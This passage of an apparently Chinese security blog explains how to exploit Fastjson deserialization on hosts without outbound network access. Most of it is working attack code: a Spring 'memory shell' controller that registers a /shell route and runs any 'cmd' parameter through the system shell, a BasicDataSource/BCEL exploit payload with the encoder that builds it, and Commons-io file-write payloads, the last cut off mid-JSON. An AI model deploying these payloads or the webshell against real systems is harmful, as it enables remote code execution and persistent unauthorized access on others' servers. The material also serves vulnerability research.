&#125;<br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130362.png" alt="image">​</p><p>‍</p><h3 id="探测JDK版本"><a href="#探测JDK版本" class="headerlink" title="探测JDK版本"></a>探测JDK版本</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 获取 Java 版本</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">javaVersion</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;java.version&quot;</span>);<br><span class="hljs-comment">// 解析主版本号</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">majorVersion</span> <span class="hljs-operator">=</span> Integer.parseInt(javaVersion.split(<span class="hljs-string">&quot;\\.&quot;</span>)[<span class="hljs-number">1</span>]);<br><span class="hljs-comment">// 进⾏版本判断</span><br>        <span class="hljs-keyword">switch</span> (majorVersion) &#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>:<br>                Thread.sleep(<span class="hljs-number">1000</span>);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">6</span>:<br>                Thread.sleep(<span class="hljs-number">2000</span>);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">7</span>:<br>                Thread.sleep(<span class="hljs-number">3000</span>);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">8</span>:<br>                Thread.sleep(<span class="hljs-number">4000</span>);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">default</span>:<br>                Thread.sleep(<span class="hljs-number">5000</span>);<br>                <span class="hljs-keyword">break</span>;<br><br></code></pre></td></tr></table></figure><p>‍</p><p><a href="assets/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A4%B1%E8%B4%A5%E7%9A%84Fastjson%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-20231209135615-stythrp.pdf">记一次失败的Fastjson漏洞利用.pdf</a></p><p>‍</p><h2 id="Fastjson-不出网利用"><a href="#Fastjson-不出网利用" class="headerlink" title="Fastjson 不出网利用"></a>Fastjson 不出网利用</h2><p><a href="https://xz.aliyun.com/t/12492#toc-3">https://xz.aliyun.com/t/12492#toc-3</a></p><h3 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h3><p>这种利用方式比较苛刻，需要parse或者parseObject第二个参数为<code>Feature.SupportNonPublicField</code>​，否则无法访问。 因为TemplatesImpl中<code>_bytecodes</code>​却是私有属性，<code>_name</code>​也是私有域，fastjson只能反序列化public</p><p>‍</p><p>这种怎么打不出网呢？</p><ul><li>对静态资源写入内容</li></ul><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130522.png" alt="image">​</p><ul><li>TemplatesImpl内存马</li></ul><p>打spring内存马进去</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.exmple;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><span class="hljs-keyword">import</span> org.springframework.web.context.WebApplicationContext;<br><span class="hljs-keyword">import</span> org.springframework.web.context.request.RequestContextHolder;<br><span class="hljs-keyword">import</span> org.springframework.web.context.request.ServletRequestAttributes;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;<br><br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.PrintWriter;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-comment">//回显spring Controller内存马</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TemplatesImplSpringController</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">TemplatesImplSpringController</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-built_in">super</span>();<br>        <span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (WebApplicationContext) RequestContextHolder.<br>                currentRequestAttributes().getAttribute(<span class="hljs-string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="hljs-number">0</span>);<br><br>        <span class="hljs-type">RequestMappingHandlerMapping</span> <span class="hljs-variable">mappingHandlerMapping</span> <span class="hljs-operator">=</span> context.getBean(RequestMappingHandlerMapping.class);<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.springframework.web.servlet.handler.AbstractHandlerMethodMapping&quot;</span>).getDeclaredMethod(<span class="hljs-string">&quot;getMappingRegistry&quot;</span>);<br>        method.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method2</span> <span class="hljs-operator">=</span> TemplatesImplSpringController.class.getMethod(<span class="hljs-string">&quot;test&quot;</span>);<br>        <span class="hljs-type">PatternsRequestCondition</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PatternsRequestCondition</span>(<span class="hljs-string">&quot;/shell&quot;</span>);<br>        <span class="hljs-type">RequestMethodsRequestCondition</span> <span class="hljs-variable">ms</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestMethodsRequestCondition</span>();<br>        <span class="hljs-type">RequestMappingInfo</span> <span class="hljs-variable">info</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestMappingInfo</span>(url, ms, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>        <span class="hljs-type">TemplatesImplSpringController</span> <span class="hljs-variable">inject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImplSpringController</span>(<span class="hljs-string">&quot;aaa&quot;</span>);<br>        mappingHandlerMapping.registerMapping(info, inject, method2);<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">TemplatesImplSpringController</span><span class="hljs-params">(String aaa)</span> &#123;<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();<br>        <span class="hljs-type">HttpServletResponse</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">arg0</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>            <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> response.getWriter();<br>            <span class="hljs-keyword">if</span> (arg0 != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-type">String</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>                java.lang.ProcessBuilder p;<br>                <span class="hljs-keyword">if</span> (System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="hljs-string">&quot;win&quot;</span>)) &#123;<br>                    p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.lang.ProcessBuilder(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, arg0&#125;);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.lang.ProcessBuilder(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, arg0&#125;);<br>                &#125;<br>                java.util.<span class="hljs-type">Scanner</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.util.Scanner(p.start().getInputStream()).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>);<br>                o = c.hasNext() ? c.next() : o;<br>                c.close();<br>                writer.write(o);<br>                writer.flush();<br>                writer.close();<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                response.sendError(<span class="hljs-number">404</span>);<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        &#125;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImplSpringController</span>();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>编译成class文件直接加载恶意类即可</p><p>‍</p><p>‍</p><p>‍</p><p>‍</p><h3 id="BasicDataSource-BCEL攻击"><a href="#BasicDataSource-BCEL攻击" class="headerlink" title="BasicDataSource(BCEL攻击)"></a>BasicDataSource(BCEL攻击)</h3><p>(需要dbcp或tomcat-dbcp的依赖)</p><p>导入依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-dbcp<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>9.0.63<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这条利用链主要是利用tomcat中<code>com.sun.org.apache.bcel.internal.util.ClassLoader#loadclass</code>​方法加载bcel字节码，之后调用defineClass进行加载字节码</p><p>先是判断了是否存在<code>$$BCEL$$</code>​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130646.png" alt="image">​</p><p>然后进行 <code>createClass</code>​ 进行BECL的解码</p><p>‍</p><p>‍</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130801.png" alt="image">​</p><p>‍</p><p>再看一下 <code>org.apache.tomcat.dbcp.dbcp2.BasicDataSource#getConnection</code>​方法中，这里调用了createDataSource方法</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130067.png" alt="image">​</p><p>跟进一下<code>createDataSource()</code>​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130274.png" alt="image">​</p><p>这里调用了<code>this.createConnectionFactory()</code>​ 再次跟进一下</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130444.png" alt="image">​</p><p>发现是把我们传入的东西作为参数调用了<code>createDriver</code>​方法执行，再次 跟进</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130615.png" alt="image">​</p><p>可以看到这里是<code>Class.forName</code>​将类加载进来，并且设置了<code>initialize</code>​参数为true【其实就是告诉Java虚拟机是否执⾏”类初始化而staic就是在类初始化加载的】而<code>Class.forName</code>​方法实际上也是调用的<code>CLassLoader</code>​ 来实现的。所以1和3都是可控的</p><p>发现最终在这行代码中 <code>driverFromCCL = Class.forName(driverClassName, true, driverClassLoader);</code>​ 将我们的BCEL语句直接被反射寻找类去加载</p><p>‍</p><p>那么后半段链子已经搞清楚了，现在目的就是搞清楚，是如何调用我们指定类的<code>getConnection</code>​呢？可是再来仔细看一下这个类</p><p>‍</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130821.png" alt="image">​</p><p><code>public Connection getConnection() </code>​</p><p>他的返回值是 <code>Connection</code>​</p><p><code>public interface Connection  extends Wrapper, AutoCloseable &#123;</code>​</p><p>并没有继承上述的五个啊，这就不符合他默认调用geter的方法了！</p><p>但这里就是一个fastjson的一个小trick了，如果在原先的json字符串上再套上一层<code>&#123;&#125;</code>​，就会吧原先的整体当做一个key来认为，来看一下poc</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130930.png" alt="image">​</p><p>可以发现 aaa为key 后面的为value，但是再套一层的话，就可以发现整体为key，value为bbb了，那么这么做的用意是什么呢？</p><p>‍</p><p>解释：</p><p>将这个 JSONObject 放在 JSON Key 的位置上，在 JSON 反序列化的时候，FastJson 会对 JSON Key 自动调用 toString() 方法：</p><p>在<code>DefaultJSONParser.java#parseObject</code>​中找到对key进行toString方法的调用</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312131130077.png" alt="image">​</p><p>而且JSONObject是Map的子类，当调用<code>toString</code>​的时候，会依次调用该类的getter方法获取值。然后会以字符串的形式输出出来。所以会调用到<code>getConnection</code>​方法</p><p>‍</p><p>EXP</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;aaa&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-comment">//这里是tomcat&gt;8的poc，如果小于8的话用到的类是</span><br>            <span class="hljs-comment">//org.apache.tomcat.dbcp.dbcp.BasicDataSource</span><br>                <span class="hljs-attr">&quot;driverClassLoader&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><br>                <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;driverClassName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$$BCEL$$$l$8b$I$A$...&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;bbb&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>‍</p><p>恶意类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Poc</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Poc</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">try</span>&#123;<br>            Runtime.getRuntime().exec(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;open -a calculator&quot;</span>&#125;);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        &#125;<br>    &#125;<br><br><span class="hljs-comment">//输出BECL语句</span><br><span class="hljs-keyword">package</span> com.exmple;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;<br><br><span class="hljs-keyword">import</span> java.io.BufferedWriter;<br><span class="hljs-keyword">import</span> java.io.FileWriter;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Path;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><br><span class="hljs-keyword">public</span>  <span class="hljs-keyword">class</span> <span class="hljs-title class_">Bcel</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">Path</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> Paths.get(<span class="hljs-string">&quot;/Users/ajie/Desktop/fastjson/target/classes/com/exmple/Poc.class(绝对路径)&quot;</span>);<br>        <span class="hljs-type">byte</span>[] bytes = Files.readAllBytes(path);<br>        System.out.println(bytes.length);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> Utility.encode(bytes,<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">BufferedWriter</span> <span class="hljs-variable">bw</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedWriter</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileWriter</span>(<span class="hljs-string">&quot;res.txt&quot;</span>));<br>        bw.write(<span class="hljs-string">&quot;$$BCEL$$&quot;</span> + result);<br>        bw.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>那么这条链子就结束，具体的用法跟TemplatesImpl链子差不多，可以加载恶意类的字节码来打内存马</p><p>‍</p><p>‍</p><h3 id="Commons-io-写文件-webshell"><a href="#Commons-io-写文件-webshell" class="headerlink" title="Commons-io 写文件&#x2F;webshell"></a>Commons-io 写文件&#x2F;webshell</h3><p>存在这个依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-io<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-io<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.5<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>‍</p><h5 id="Jre8-原始poc"><a href="#Jre8-原始poc" class="headerlink" title="Jre8 原始poc"></a>Jre8 原始poc</h5><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;x&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;sun.rmi.server.MarshalOutputStream&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;out&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.util.zip.InflaterOutputStream&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;out&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.io.FileOutputStream&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;file&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;/tmp/dest.txt&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;append&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">false</span></span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;infl&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;input&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;eJwL8nUyNDJSyCxWyEgtSgUAHKUENw==&quot;</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;bufLen&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1048576</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;protocolVersion&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>‍</p><h5 id="commons-io-2-0-2-6-版本："><a href="#commons-io-2-0-2-6-版本：" class="headerlink" title="commons-io 2.0 - 2.6 版本："></a>commons-io 2.0 - 2.6 版本：</h5><p>‍</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;x&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.alibaba.fastjson.JSONObject&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;input&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>      <span 